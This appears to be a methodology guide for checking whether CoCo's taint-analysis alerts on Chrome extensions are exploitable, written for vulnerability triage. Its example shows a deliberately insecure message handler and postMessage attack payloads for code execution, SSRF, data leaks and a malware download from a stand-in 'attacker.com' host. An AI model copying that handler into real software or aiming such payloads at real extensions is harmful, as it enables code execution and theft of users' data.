# CoCo Vulnerability Analysis Methodology

## Mission

Determine if CoCo detected a **TRUE POSITIVE** vulnerability with a working attack path under our refined threat model.

**Core Principle:** If ANY attack path exists where an external attacker (malicious website or extension) can trigger a flow from attacker-controlled sources to privileged APIs, achieving exploitable impact (code execution, privileged cross-origin requests, arbitrary downloads, sensitive data exfiltration, or complete storage exploitation chains) → TRUE POSITIVE

**Analysis Scope:** We analyze only the specific flows CoCo detected. We do NOT search for additional vulnerabilities CoCo may have missed.

---

## CRITICAL ANALYSIS RULES

**These rules override all other considerations:**

1. **IGNORE manifest.json restrictions on message passing:**

   - IGNORE `externally_connectable` domain whitelists
   - IGNORE `content_scripts` matches patterns
   - If code has `chrome.runtime.onMessageExternal`, `window.addEventListener("message")`, or `document.addEventListener()`, assume ANY attacker can trigger it
   - Even if only ONE specific domain/extension can exploit it → TRUE POSITIVE

2. **Storage poisoning alone is NOT a vulnerability:**

   - `attacker → storage.set` without retrieval = FALSE POSITIVE
   - For TRUE POSITIVE, stored data MUST flow back to attacker via:
     - sendResponse / postMessage to attacker
     - Used in fetch() to attacker-controlled URL
     - Used in executeScript / eval
     - Any path where attacker can observe/retrieve the poisoned value

3. **Hardcoded backend URLs are still trusted infrastructure:**
   - Data TO/FROM developer's own backend servers = FALSE POSITIVE
   - Attacker sending data to `hardcoded.com` = FALSE POSITIVE
   - Compromising developer infrastructure is separate from extension vulnerabilities

---

## Step 1: Extract CoCo Detection

**File:** `extensions/{extension_id}/opgen_generated_files/used_time.txt`

Look for: `tainted detected!~~~in extension: [source] with [sink_type]`
[flow]=[source]->[sink]

**IMPORTANT - CoCo Output Format:**

CoCo traces show TWO types of identifiers:

1. **Internal trace IDs (IGNORE THESE):** Bracketed arrays like `(['11714', '16535', '16547'], [source])`

   - These are CoCo's internal identifiers, NOT line numbers

2. **Actual line numbers (USE THESE):** Formatted as `Line 332`, `Line 1023`, etc.
   - These reference actual source code locations
   - Format: `$FilePath$...file.js\nLine 332\t<code snippet>`

**Extract:**

- Source type: where does the data come from?
- Sink type: What dangerous operation (chrome*storage*\*\_set_sink, executeScript, fetch_resource_sink, etc.) are exploited
- **Line numbers** marked as "Line 123" (NOT bracketed arrays)
- Files paths: list of `bg.js` and other `cs_*.js` files flagged by CoCo

### 2.1 **Trace from CoCo's reported lines:**

1. Start at the **exact line numbers** CoCo reported in `used_time.txt`
2. Trace **upward** to find the entry point (source)
3. Trace **downward** to find where data flows (sink)
4. Check `manifest.json` for required permissions

**Files to examine (in opgen_generated_files/):**

- `bg.js` - Background script
- `cs_*.js` - Content scripts

**Note:** All CoCo-generated files contain original extension code after the 3rd "// original [file-path]" marker. Only analyze opgen_generated_files. If the flow is unclear from CoCo flagged files, further exploration of the original extension files is encouraged to clarify what the attacker can do over the alleged vulnerable CoCo reported flow.

### 2.2 **Trace the Flow**

Find the exact lines CoCo reported and answer:

1. **Does the flow exist?**

   - Search for 3rd "// original [file-path]" marker in bg.js or cs\_\*.js to find actual extension code
   - **CRITICAL: If CoCo only detected flows in framework code (before the 3rd "// original" marker)**, you MUST search the actual extension code (after the marker) for the reported [source] and [sink] APIs to verify whether the extension is truly vulnerable or safe on the reported flow
   - If CoCo only references framework code lines, note this in the analysis, and search for matches after the 3rd "// original [file-path]" marker

2. **Trace the COMPLETE data flow path:**

   - **Entry point:** Where does attacker-controlled data flow from? (DOM event, postMessage, external message, etc.)
   - **Message passing:** How does data travel between content script and background? (chrome.runtime.sendMessage, etc.)
   - **Handler functions:** What functions receive and process this data? Follow the call chain
   - **Sink:** Where does the data end up to? (fetch, executeScript, storage.set, etc.)
   - **Document each step:** Note which variables carry attacker-controlled data through the chain

3. **Is the flow executable = Can the [flow] be called from outside the extension?**

   - Is the start of the vulnerability accessible from listeners or message passing?
   - can any website/specific websites, extensions, etc call this extension to run this code path

4. **Does extension have required permissions?**
   - Check manifest.json for necessary permissions
   - If permission missing → FALSE POSITIVE

## Step 3: Classify and Document Exploit

**Objective**: Determine if TRUE POSITIVE (exploitable vulnerability) or FALSE POSITIVE (safe), document complete attack path with exploit code or reason why safe.

**Critical Questions:**

1. **Can attacker trigger the flow?** (executable from outside)
2. **Can attacker control the data in the flow?** (exploitable by attacker)
3. **Is the flow actually vulnerable?** (flow opens vulnerability)

### Definition of True Positive (TP)

A **True Positive** occurs when ALL of these are true:

1. **Flow Exists in Real Code**: The source→sink data flow is in actual extension code (not just CoCo framework mock)
2. **External Attacker Trigger Available**: External attacker can trigger from outside (malicious webpages via DOM events/postMessage, malicious extensions via chrome.runtime.onMessageExternal)
   - **NOT attacker-triggered:** User inputs in extension's own UI (popup, options page, etc.) - user ≠ attacker
   - **IS attacker-triggered:** User inputs on webpages monitored by extension - attacker controls the webpage
   - **CRITICAL: IGNORE manifest.json externally_connectable restrictions!** Analyze the actual message passing code only. If the code allows chrome.runtime.onMessageExternal or window.postMessage, assume ANY attacker can exploit it, regardless of manifest restrictions. If even ONE webpage/extension can trigger it, classify as TRUE POSITIVE.
3. **Permissions Present**: Extension has required permissions in manifest.json
4. **Attacker-Controllable Data**: Attacker controls data flowing to the sink
   - **NOT attacker-controlled:** Data from/to hardcoded developer backend URLs (trusted infrastructure)
5. **Exploitable Impact**: Flow achieves one of:
   - Code execution (eval, executeScript)
   - Privileged cross-origin requests to attacker-controlled destinations
   - Arbitrary downloads
   - Sensitive data exfiltration (cookies, history, bookmarks)
   - **Complete storage exploitation chain:** attacker data → storage.set → storage.get → attacker-accessible output (sendResponse, postMessage, attacker-controlled URL)
   - **CRITICAL FOR STORAGE: Storage poisoning alone (storage.set without retrieval) is NOT exploitable!** The stored value MUST flow back to the attacker through sendResponse, postMessage, or be used in a subsequent vulnerable operation (fetch to attacker URL, executeScript, etc.) to be TRUE POSITIVE.

### Definition of False Positive (FP)

A **False Positive** occurs when ANY of these is true:

1. **No External Attacker Trigger**:
   - User inputs in extension's own UI (popup, options, settings)
   - Internal extension logic only
   - Cannot be triggered by external attacker
2. **Missing Permissions**: Required permission not present in manifest.json
3. **Involves Hardcoded Backend URLs** (Trusted Infrastructure):
   - Data TO hardcoded backend: `attacker-data → fetch("https://api.myextension.com")`
   - Data FROM hardcoded backend: `fetch("https://api.myextension.com") → response → eval(response)`
   - Storage to hardcoded backend: `storage.get → fetch("https://api.myextension.com")`
   - Developer trusts their own infrastructure; compromising it is infrastructure issue, not extension vulnerability
4. **Incomplete Storage Exploitation**:
   - `storage.set` only, without `storage.get → attacker-accessible output`
   - `storage.get → fetch(hardcodedBackendURL)` (goes to trusted infrastructure, not attacker)
   - **IMPORTANT:** Storage poisoning without retrieval path is NOT exploitable. The attacker MUST be able to retrieve the poisoned data back (via sendResponse, postMessage, or triggering a read operation that sends data to attacker-controlled destination)
5. **No Exploitable Impact**: Flow exists but doesn't achieve any exploitable impact criteria

### Common Attack Vectors (TP Patterns):

**A. Content Script DOM Events** - `document.addEventListener()` in cs\_\*.js → webpage can dispatch ANY event

- **IGNORE** manifest content_scripts matches restrictions - if event listener exists, assume exploitable

**B. window.postMessage** - `window.addEventListener("message")` in cs\_\*.js → webpage can send messages

- **IGNORE** manifest content_scripts matches restrictions - if postMessage listener exists, assume exploitable

**C. External Messages** - `chrome.runtime.onMessageExternal` → other extensions OR whitelisted websites can send messages

- **IGNORE** manifest.json externally_connectable restrictions - if onMessageExternal exists, assume exploitable
- Even if only ONE domain is whitelisted, treat as TRUE POSITIVE if the flow is exploitable

**D. Information Disclosure** - Attacker triggers storage read → receives sensitive data back via sendResponse/postMessage

### Common False Positive Patterns:

**V. User Input in Extension UI** - User typing in extension's own popup/options/settings (user ≠ attacker)

**W. Missing Permissions** - Sink requires permission not in manifest.json

**X. Hardcoded Backend URLs (Trusted Infrastructure):**

- Data TO hardcoded backend: `fetch("https://api.myextension.com", {body: attackerData})`
- Data FROM hardcoded backend: `fetch("https://api.myextension.com") → response → eval(response)`
- Storage to hardcoded backend: `storage.get → fetch("https://api.myextension.com")`

**Y. Incomplete Storage Exploitation:**

- `attacker → storage.set` only (no retrieval path to attacker)
- `storage.get → fetch(hardcodedBackendURL)` (trusted destination, not attacker-accessible)
- **Storage poisoning alone is NOT a vulnerability** - data must flow back to attacker to be exploitable

**Z. Internal Logic Only** - No external attacker trigger to initiate flow

**AA. No Exploitable Impact** - Data flow exists but doesn't achieve code execution, exfiltration, downloads, or complete storage exploitation chain

---

### How to Document:

**If TRUE POSITIVE:**

1. **Code**: Show COMPLETE path from entry point → handler functions → sink
   - Mark attacker-controlled data with `// ← attacker-controlled`
   - Include all intermediate steps (message passing, function calls)
2. **Attack**: Working exploit code
3. **Impact**: What attacker achieves (1-2 sentences)

**If FALSE POSITIVE:**

1. **Reason**: Why it's safe (1-2 sentences max)

**Example (Complete Path with Common Attack Scenarios):**

```javascript
// Content script - Entry point (cs_0.js)
window.addEventListener("message", function (event) {
  chrome.runtime.sendMessage(event.data); // ← attacker-controlled payload
});

// Background - Message handler (bg.js)
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  if (request.action === "store") {
    chrome.storage.local.set({ data: request.value }); // Storage write sink
  } else if (request.action === "fetch") {
    fetch(request.url, { body: request.data }); // SSRF sink
  } else if (request.action === "exec") {
    chrome.tabs.executeScript(sender.tab.id, { code: request.code }); // Code exec sink
  } else if (request.action === "download") {
    chrome.downloads.download({ url: request.url }); // Download sink
  } else if (request.action === "read") {
    chrome.storage.local.get(null, (data) => sendResponse(data)); // Storage read/leak
  }
});

// Attack Scenarios:
// SSRF:
window.postMessage({ action: "fetch", url: "http://internal/admin", data: "payload" }, "*");

// Code execution:
window.postMessage({ action: "exec", code: "alert(document.cookie)" }, "*");

// Malicious download:
window.postMessage({ action: "download", url: "http://attacker.com/malware.exe" }, "*");

// Information disclosure (storage read):
window.postMessage({ action: "read" }, "*"); // Extension sends back all storage data

// Impact: Multiple vulnerabilities - SSRF, arbitrary code execution,
// malicious downloads, and information disclosure of stored data
```

### If FALSE POSITIVE:

**Write:**

1. **Reason**: Which criterion failed (1-2 sentences max)

---

## Output Format

**Analysis File Location:** `./llm coco analysis/{extension_id}_analysis.md` (relative to this methodology file)

**IMPORTANT:** Create the analysis file at the above location with the filename format: `{extension_id}_analysis.md`

````markdown
# CoCo Analysis: {extension_id}

## Summary

- **Overall Assessment:** TRUE POSITIVE / FALSE POSITIVE
- **Total Sinks Detected:** {number}

---

## Sink: {source} → {sink} [(referenced only CoCo framework code) if applicable]

**CoCo Trace:**
$FilePath/$ExtensionID/opgen_generated_files/bg.js
Line X {code}

If the {code} lines referenced are not from original extension and only from CoCo generated code, then look into in the original extensions code (after third "\\" original marking) for matches and evaluate if the extension is indeed vulnerable regarding the reported [source] and [sink] based on the referenced lines.

**Code:**

```javascript
// [IF TP] Show COMPLETE path: entry point → handlers → sink
// Mark attacker-controlled data with comments (← attacker-controlled)
// [IF FP] Minimal relevant code showing why it's safe
```
````

**Classification:** TRUE POSITIVE / FALSE POSITIVE

**[IF TP] Attack Vector:** {DOM event / postMessage / external message / etc.}

**[IF TP] Attack:**

```javascript
// Working exploit showing how to trigger the vulnerability
```

**[IF TP] Impact:** {what attacker achieves}

**[IF FP] Reason:** {why it's FP - 1-2 sentences max}

```

```
